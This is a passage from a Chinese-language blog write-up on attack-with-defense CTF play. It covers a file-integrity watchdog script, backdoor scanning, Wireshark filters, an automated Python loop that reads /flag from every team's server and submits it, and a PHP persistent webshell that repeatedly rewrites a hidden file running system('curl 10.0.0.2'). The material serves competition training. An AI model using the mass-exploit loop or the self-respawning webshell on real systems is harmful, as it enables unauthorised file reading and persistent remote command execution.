class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-comment">#use: python file_check.py ./</span></span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"><span class="hljs-keyword">import</span> hashlib</span><br><span class="line"><span class="hljs-keyword">import</span> shutil</span><br><span class="line"><span class="hljs-keyword">import</span> ntpath</span><br><span class="line"><span class="hljs-keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">CWD = os.getcwd()</span><br><span class="line">FILE_MD5_DICT = {}      <span class="hljs-comment"># 文件MD5字典</span></span><br><span class="line">ORIGIN_FILE_LIST = []</span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment"># 特殊文件路径字符串</span></span><br><span class="line">Special_path_str = <span class="hljs-string">'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'</span></span><br><span class="line">bakstring = <span class="hljs-string">'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'</span></span><br><span class="line">logstring = <span class="hljs-string">'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'</span></span><br><span class="line">webshellstring = <span class="hljs-string">'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'</span></span><br><span class="line">difffile = <span class="hljs-string">'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'</span></span><br><span class="line"> </span><br><span class="line">Special_string = <span class="hljs-string">'cjM00N'</span>  <span class="hljs-comment"># 免死金牌</span></span><br><span class="line">UNICODE_ENCODING = <span class="hljs-string">"utf-8"</span></span><br><span class="line">INVALID_UNICODE_CHAR_FORMAT = <span class="hljs-string">r"\?%02x"</span></span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment"># 文件路径字典</span></span><br><span class="line">spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))</span><br><span class="line">Special_path = {</span><br><span class="line">    <span class="hljs-string">'bak'</span> : os.path.realpath(os.path.join(spec_base_path, bakstring)),</span><br><span class="line">    <span class="hljs-string">'log'</span> : os.path.realpath(os.path.join(spec_base_path, logstring)),</span><br><span class="line">    <span class="hljs-string">'webshell'</span> : os.path.realpath(os.path.join(spec_base_path, webshellstring)),</span><br><span class="line">    <span class="hljs-string">'difffile'</span> : os.path.realpath(os.path.join(spec_base_path, difffile)),</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isListLike</span><span class="hljs-params">(value)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">return</span> isinstance(value, (list, tuple, set))</span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment"># 获取Unicode编码</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getUnicode</span><span class="hljs-params">(value, encoding=None, noneToNull=False)</span>:</span></span><br><span class="line"> </span><br><span class="line">    <span class="hljs-keyword">if</span> noneToNull <span class="hljs-keyword">and</span> value <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> NULL</span><br><span class="line"> </span><br><span class="line">    <span class="hljs-keyword">if</span> isListLike(value):</span><br><span class="line">        value = list(getUnicode(_, encoding, noneToNull) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> value)</span><br><span class="line">        <span class="hljs-keyword">return</span> value</span><br><span class="line"> </span><br><span class="line">    <span class="hljs-keyword">if</span> isinstance(value, unicode):</span><br><span class="line">        <span class="hljs-keyword">return</span> value</span><br><span class="line">    <span class="hljs-keyword">elif</span> isinstance(value, basestring):</span><br><span class="line">        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</span><br><span class="line">            <span class="hljs-keyword">try</span>:</span><br><span class="line">                <span class="hljs-keyword">return</span> unicode(value, encoding <span class="hljs-keyword">or</span> UNICODE_ENCODING)</span><br><span class="line">            <span class="hljs-keyword">except</span> UnicodeDecodeError, ex:</span><br><span class="line">                <span class="hljs-keyword">try</span>:</span><br><span class="line">                    <span class="hljs-keyword">return</span> unicode(value, UNICODE_ENCODING)</span><br><span class="line">                <span class="hljs-keyword">except</span>:</span><br><span class="line">                    value = value[:ex.start] + <span class="hljs-string">""</span>.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> value[ex.start:ex.end]) + value[ex.end:]</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        <span class="hljs-keyword">try</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> unicode(value)</span><br><span class="line">        <span class="hljs-keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="hljs-keyword">return</span> unicode(str(value), errors=<span class="hljs-string">"ignore"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment"># 目录创建</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mkdir_p</span><span class="hljs-params">(path)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">import</span> errno</span><br><span class="line">    <span class="hljs-keyword">try</span>:</span><br><span class="line">        os.makedirs(path)</span><br><span class="line">    <span class="hljs-keyword">except</span> OSError <span class="hljs-keyword">as</span> exc:</span><br><span class="line">        <span class="hljs-keyword">if</span> exc.errno == errno.EEXIST <span class="hljs-keyword">and</span> os.path.isdir(path):</span><br><span class="line">            <span class="hljs-keyword">pass</span></span><br><span class="line">        <span class="hljs-keyword">else</span>: <span class="hljs-keyword">raise</span></span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment"># 获取当前所有文件路径</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getfilelist</span><span class="hljs-params">(cwd)</span>:</span></span><br><span class="line">    filelist = []</span><br><span class="line">    <span class="hljs-keyword">for</span> root,subdirs, files <span class="hljs-keyword">in</span> os.walk(cwd):</span><br><span class="line">        <span class="hljs-keyword">for</span> filepath <span class="hljs-keyword">in</span> files:</span><br><span class="line">            originalfile = os.path.join(root, filepath)</span><br><span class="line">            <span class="hljs-keyword">if</span> Special_path_str <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> originalfile:</span><br><span class="line">                filelist.append(originalfile)</span><br><span class="line">    <span class="hljs-keyword">return</span> filelist</span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment"># 计算机文件MD5值</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">calcMD5</span><span class="hljs-params">(filepath)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">try</span>:</span><br><span class="line">        <span class="hljs-keyword">with</span> open(filepath,<span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:</span><br><span class="line">            md5obj = hashlib.md5()</span><br><span class="line">            md5obj.update(f.read())</span><br><span class="line">            hash = md5obj.hexdigest()</span><br><span class="line">            <span class="hljs-keyword">return</span> hash</span><br><span class="line">    <span class="hljs-keyword">except</span> Exception, e:</span><br><span class="line">        <span class="hljs-keyword">print</span> <span class="hljs-string">u'[!] getmd5_error : '</span> + getUnicode(filepath)</span><br><span class="line">        <span class="hljs-keyword">print</span> getUnicode(e)</span><br><span class="line">        <span class="hljs-keyword">try</span>:</span><br><span class="line">            ORIGIN_FILE_LIST.remove(filepath)</span><br><span class="line">            FILE_MD5_DICT.pop(filepath, <span class="hljs-literal">None</span>)</span><br><span class="line">        <span class="hljs-keyword">except</span> KeyError, e:</span><br><span class="line">            <span class="hljs-keyword">pass</span></span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment"># 获取所有文件MD5</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getfilemd5dict</span><span class="hljs-params">(filelist = [])</span>:</span></span><br><span class="line">    filemd5dict = {}</span><br><span class="line">    <span class="hljs-keyword">for</span> ori_file <span class="hljs-keyword">in</span> filelist:</span><br><span class="line">        <span class="hljs-keyword">if</span> Special_path_str <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ori_file:</span><br><span class="line">            md5 = calcMD5(os.path.realpath(ori_file))</span><br><span class="line">            <span class="hljs-keyword">if</span> md5:</span><br><span class="line">                filemd5dict[ori_file] = md5</span><br><span class="line">    <span class="hljs-keyword">return</span> filemd5dict</span><br><span class="line"> </span><br><span class="line"><span class="hljs-comment"># 备份所有文件</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">backup_file</span><span class="hljs-params">(filelist=[])</span>:</span></span><br><span class="line">    <span class="hljs-comment"># if len(os.listdir(Special_path['bak'])) == 0:</span></span><br><span class="line">    <span class="hljs-keyword">for</span> filepath <span class="hljs-keyword">in</span> filelist:</span><br><span class="line">        <span class="hljs-keyword">if</span> Special_path_str <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> filepath:</span><br><span class="line">            shutil.copy2(filepath, Special_path[<span class="hljs-string">'bak'</span>])</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    <span class="hljs-keyword">print</span> <span class="hljs-string">u'---------start------------'</span></span><br><span class="line">    <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> Special_path:</span><br><span class="line">        mkdir_p(Special_path[value])</span><br><span class="line">    <span class="hljs-comment"># 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span></span><br><span class="line">    ORIGIN_FILE_LIST = getfilelist(CWD)</span><br><span class="line">    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">    backup_file(ORIGIN_FILE_LIST) <span class="hljs-comment"># TODO 备份文件可能会产生重名BUG</span></span><br><span class="line">    <span class="hljs-keyword">print</span> <span class="hljs-string">u'[*] pre work end!'</span></span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</span><br><span class="line">        file_list = getfilelist(CWD)</span><br><span class="line">        <span class="hljs-comment"># 移除新上传文件</span></span><br><span class="line">        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))</span><br><span class="line">        <span class="hljs-keyword">if</span> len(diff_file_list) != <span class="hljs-number">0</span>:</span><br><span class="line">            <span class="hljs-comment"># import pdb;pdb.set_trace()</span></span><br><span class="line">            <span class="hljs-keyword">for</span> filepath <span class="hljs-keyword">in</span> diff_file_list:</span><br><span class="line">                <span class="hljs-keyword">try</span>:</span><br><span class="line">                    f = open(filepath, <span class="hljs-string">'r'</span>).read()</span><br><span class="line">                <span class="hljs-keyword">except</span> Exception, e:</span><br><span class="line">                    <span class="hljs-keyword">break</span></span><br><span class="line">                <span class="hljs-keyword">if</span> Special_string <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> f:</span><br><span class="line">                    <span class="hljs-keyword">try</span>:</span><br><span class="line">                        <span class="hljs-keyword">print</span> <span class="hljs-string">u'[*] webshell find : '</span> + getUnicode(filepath)</span><br><span class="line">                        shutil.move(filepath, os.path.join(Special_path[<span class="hljs-string">'webshell'</span>], ntpath.basename(filepath) + <span class="hljs-string">'.txt'</span>))</span><br><span class="line">                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:</span><br><span class="line">                        <span class="hljs-keyword">print</span> <span class="hljs-string">u'[!] move webshell error, "%s" maybe is webshell.'</span>%getUnicode(filepath)</span><br><span class="line">                    <span class="hljs-keyword">try</span>:</span><br><span class="line">                        f = open(os.path.join(Special_path[<span class="hljs-string">'log'</span>], <span class="hljs-string">'log.txt'</span>), <span class="hljs-string">'a'</span>)</span><br><span class="line">                        f.write(<span class="hljs-string">'newfile: '</span> + getUnicode(filepath) + <span class="hljs-string">' : '</span> + str(time.ctime()) + <span class="hljs-string">'\n'</span>)</span><br><span class="line">                        f.close()</span><br><span class="line">                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:</span><br><span class="line">                        <span class="hljs-keyword">print</span> <span class="hljs-string">u'[-] log error : file move error: '</span> + getUnicode(e)</span><br><span class="line"> </span><br><span class="line">        <span class="hljs-comment"># 防止任意文件被修改,还原被修改文件</span></span><br><span class="line">        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)</span><br><span class="line">        <span class="hljs-keyword">for</span> filekey <span class="hljs-keyword">in</span> md5_dict:</span><br><span class="line">            <span class="hljs-keyword">if</span> md5_dict[filekey] != FILE_MD5_DICT[filekey]:</span><br><span class="line">                <span class="hljs-keyword">try</span>:</span><br><span class="line">                    f = open(filekey, <span class="hljs-string">'r'</span>).read()</span><br><span class="line">                <span class="hljs-keyword">except</span> Exception, e:</span><br><span class="line">                    <span class="hljs-keyword">break</span></span><br><span class="line">                <span class="hljs-keyword">if</span> Special_string <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> f:</span><br><span class="line">                    <span class="hljs-keyword">try</span>:</span><br><span class="line">                        <span class="hljs-keyword">print</span> <span class="hljs-string">u'[*] file had be change : '</span> + getUnicode(filekey)</span><br><span class="line">                        shutil.move(filekey, os.path.join(Special_path[<span class="hljs-string">'difffile'</span>], ntpath.basename(filekey) + <span class="hljs-string">'.txt'</span>))</span><br><span class="line">                        shutil.move(os.path.join(Special_path[<span class="hljs-string">'bak'</span>], ntpath.basename(filekey)), filekey)</span><br><span class="line">                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:</span><br><span class="line">                        <span class="hljs-keyword">print</span> <span class="hljs-string">u'[!] move webshell error, "%s" maybe is webshell.'</span>%getUnicode(filekey)</span><br><span class="line">                    <span class="hljs-keyword">try</span>:</span><br><span class="line">                        f = open(os.path.join(Special_path[<span class="hljs-string">'log'</span>], <span class="hljs-string">'log.txt'</span>), <span class="hljs-string">'a'</span>)</span><br><span class="line">                        f.write(<span class="hljs-string">'diff_file: '</span> + getUnicode(filekey) + <span class="hljs-string">' : '</span> + getUnicode(time.ctime()) + <span class="hljs-string">'\n'</span>)</span><br><span class="line">                        f.close()</span><br><span class="line">                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:</span><br><span class="line">                        <span class="hljs-keyword">print</span> <span class="hljs-string">u'[-] log error : done_diff: '</span> + getUnicode(filekey)</span><br><span class="line">                        <span class="hljs-keyword">pass</span></span><br><span class="line">        time.sleep(<span class="hljs-number">2</span>)</span><br><span class="line">        <span class="hljs-comment"># print '[*] ' + getUnicode(time.ctime())</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<h3 id="扫后门"><a href="#扫后门" class="headerlink" title="扫后门"></a>扫后门</h3><p>题目备份后拉下来用D盾扫一下后门, 一般来说awd都会预留一个后门, 让比赛快速推进</p>
<p>直接把文件夹丢进去就可以了</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822183213.png" alt></p>
<p>很明显就能看到有后门, 先删自己的, 再看看能不能利用打一波</p>
<h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><h4 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h4><p>这次比赛提供了pcap流量包, 不会用wireshark看的头疼, 比赛都是直接记事本打开看….后面去学习了一下</p>
<p>首先分析一下这次的网络拓扑</p>
<p>假设队伍id为1, 则队伍的选手在</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.1.1-10</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>题目则在</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.1.21-30</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>其他队伍类似, 只是id不同</p>
<p>首先打开wireshark,如图, 下面介绍几种过滤, 不同过滤之间使用<code>and</code>连接</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822172654.png" alt></p>
<h5 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h5><p>可以看到protocol协议有http和tcp两种, tcp都是握手包, 我们可以先筛选出http包, 过滤器中输入</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822172933.png" alt></p>
<h5 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h5><p>一般来说长度较长的可能是关键的流量, 点击length按长度排序</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822173041.png" alt></p>
<p>当然这里就是另外一种情况了, 长的全都是垃圾流量hhhh</p>
<h5 id="http方式"><a href="#http方式" class="headerlink" title="http方式"></a>http方式</h5><p>可以过滤 get和post两种, 优先可以考虑post</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method=="POST"</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822173334.png" alt></p>
<h5 id="ip"><a href="#ip" class="headerlink" title="ip"></a>ip</h5><p>如果觉得某个ip一直访问或者每隔一段时间就访问一次, 这种很有可能就是exp访问, 这就需要过滤ip来看一下他的流量了</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src == 10.10.1.14</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822173651.png" alt></p>
<p>其他的ip过滤如下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 源ip和目的ip</span><br><span class="line">ip.addr == 10.10.1.14</span><br><span class="line"># 目的ip</span><br><span class="line">ip.dst == 10.10.1.14</span><br></pre></td></tr></tbody></table></figure><p></p>
<h5 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h5><p>用的不多, 命令如下</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 源端口和目的端口</span><br><span class="line">tcp.port == 80</span><br><span class="line"># 源端口</span><br><span class="line">tcp.srcport == 80</span><br><span class="line"># 目的端口</span><br><span class="line">tcp.dstport == 80</span><br></pre></td></tr></tbody></table></figure><p></p>
<h5 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h5><p>也比较少用</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eth.addr == 20:dc:e6:f3:78:cc</span><br></pre></td></tr></tbody></table></figure><p></p>
<h5 id="追踪数据流"><a href="#追踪数据流" class="headerlink" title="追踪数据流"></a>追踪数据流</h5><p>如果怀疑某个包有问题, 可以右键追踪数据流</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822174223.png" alt></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822174253.png" alt></p>
<h5 id="直接搜索字段"><a href="#直接搜索字段" class="headerlink" title="直接搜索字段"></a>直接搜索字段</h5><p>在分组字节流搜索字符串, 说不定有奇效(图中就是有效流量</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822174704.png" alt></p>
<h4 id="log记录"><a href="#log记录" class="headerlink" title="log记录"></a>log记录</h4><p>如果不会看wireshark(比如我)或者是不提供流量包的比赛, 就需要自己上waf去监控了, 抓取的流量如下</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822175207.png" alt></p>
<p>后面就是分析流量了, 有个需要注意的点是, 建议在抓取流量的时候, 按时间分流量包, 比如10分钟一个文件, 这样流量不会太大, 加载起来也快, 读起来也方便</p>
<p>如果遇到垃圾流量多的时候一个文件就很难顶了</p>
<h3 id="快速攻击"><a href="#快速攻击" class="headerlink" title="快速攻击"></a>快速攻击</h3><p>快速攻击主要利用的是burpsuite和它的一个插件</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822184236.png" alt></p>
<p>这个插件可以快速的把burp抓到的包转换成代码, 一般为python, 使用的是request库</p>
<p>使用如下, 在包内右键, 然后选择</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Generate Script</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>就会出现转换的代码了, 直接复制后改一下就可以打了</p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822184359.png" alt></p>
<p>对于扫出来的后门或者流量分析出来的payload都可以这样用burp快速复现并直接生成代码去打</p>
<h3 id="全场攻击"><a href="#全场攻击" class="headerlink" title="全场攻击"></a>全场攻击</h3><p>以其中一个脚本为例, 首先使用上面提到的插件生成代码后粘贴进来, 然后根据题目分布, 写个for循环打一遍, 再利用while True让程序死循环跑, 如果某个ip已经不可以打的话就将其加到ban列表里面, 然后每轮输出一共打了几个, 再sleep(300), 也就是5分钟, 比赛是一轮10分钟, 一轮打两次避免特殊情况(如打的时候突然宕机等等)</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep</span><br><span class="line">session = requests.Session()</span><br><span class="line">ban = []</span><br><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</span><br><span class="line">    num = <span class="hljs-number">0</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">11</span>):</span><br><span class="line">        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> ban:</span><br><span class="line">            <span class="hljs-keyword">continue</span></span><br><span class="line">        url = <span class="hljs-string">"http://10.10.%d.30/index.php"</span> % i</span><br><span class="line">        <span class="hljs-comment">#print url</span></span><br><span class="line">        paramsGet = {<span class="hljs-string">"a"</span>:<span class="hljs-string">"show_pic"</span>,<span class="hljs-string">"c"</span>:<span class="hljs-string">"index"</span>,<span class="hljs-string">"file"</span>:<span class="hljs-string">"/flag"</span>}</span><br><span class="line">        headers = {<span class="hljs-string">"Cache-Control"</span>:<span class="hljs-string">"no-cache"</span>,<span class="hljs-string">"Accept"</span>:<span class="hljs-string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"</span>,<span class="hljs-string">"Upgrade-Insecure-Requests"</span>:<span class="hljs-string">"1"</span>,<span class="hljs-string">"User-Agent"</span>:<span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"</span>,<span class="hljs-string">"Connection"</span>:<span class="hljs-string">"close"</span>,<span class="hljs-string">"Pragma"</span>:<span class="hljs-string">"no-cache"</span>,<span class="hljs-string">"Accept-Encoding"</span>:<span class="hljs-string">"gzip, deflate"</span>,<span class="hljs-string">"Accept-Language"</span>:<span class="hljs-string">"zh,zh-CN;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6"</span>}</span><br><span class="line">        <span class="hljs-keyword">try</span>:</span><br><span class="line">            response = session.get(url, params=paramsGet, headers=headers, timeout=<span class="hljs-number">1</span>).content.strip()</span><br><span class="line">            <span class="hljs-keyword">if</span> len(response) > <span class="hljs-number">20</span>:</span><br><span class="line">                r2 = requests.post(<span class="hljs-string">'http://10.66.66.66/api/v1/ad/web/submit_flag/?event_id=1'</span>,data={<span class="hljs-string">"flag"</span>: response,<span class="hljs-string">"token"</span>:<span class="hljs-string">"dzVaFmggB2WXHDjwMGug8uXi7TTRBEBNxZxHGCngJskgm"</span>})</span><br><span class="line">                <span class="hljs-keyword">print</span> r2.text</span><br><span class="line">                <span class="hljs-keyword">if</span> <span class="hljs-string">"success"</span> <span class="hljs-keyword">in</span> r2.text:</span><br><span class="line">                    num += <span class="hljs-number">1</span></span><br><span class="line">                <span class="hljs-comment">#print(response)</span></span><br><span class="line">            <span class="hljs-keyword">else</span>:</span><br><span class="line">                <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ban:</span><br><span class="line">                    ban.append(i)</span><br><span class="line">            sleep(<span class="hljs-number">1</span>)</span><br><span class="line">        <span class="hljs-keyword">except</span>:</span><br><span class="line">            <span class="hljs-keyword">pass</span></span><br><span class="line">    <span class="hljs-keyword">print</span> num</span><br><span class="line">    sleep(<span class="hljs-number">300</span>)</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>不过这个写的还是比较糙的, 没有什么参考价值, 大家看一看就好</p>
<h3 id="不死马与杀马"><a href="#不死马与杀马" class="headerlink" title="不死马与杀马"></a>不死马与杀马</h3><p>一般不死马大概长这样</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta"><?php</span></span><br><span class="line">    set_time_limit(<span class="hljs-number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="hljs-keyword">true</span>);</span><br><span class="line"></span><br><span class="line">	$file = <span class="hljs-string">'.conifg.php'</span>;</span><br><span class="line">	$shell = <span class="hljs-string">"<?php echo system("</span>curl <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span><span class="hljs-string">"); ?>"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">while</span>(<span class="hljs-keyword">true</span>){</span><br><span class="line">        file_put_contents($file, $shell);</span><br><span class="line">        system(<span class="hljs-string">'chmod 777 .demo.php'</span>);</span><br><span class="line"></span><br><span class="line">        usleep(<span class="hljs-number">50</span>);</span><br><span class="line">        }</span><br><span class="line"><span class="hljs-meta">?></span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>里面有几个点, 首先是文件名, 在linux下面有两种文件名开头比较特别</p>
<ul>
<li><code>.</code>开头, 这种文件在linux下为隐藏文件, 直接ls看不到, 需要用<code>ls -all</code> 或者<code>ll</code>才能看到</li>
</ul>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822190931.png" alt></p>
<ul>
<li><code>-</code>开头, 会被linux命令识别为参数,  删除会出错</li>
</ul>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822191552.png" alt></p>
<p>这里可以使用命令如下</p>
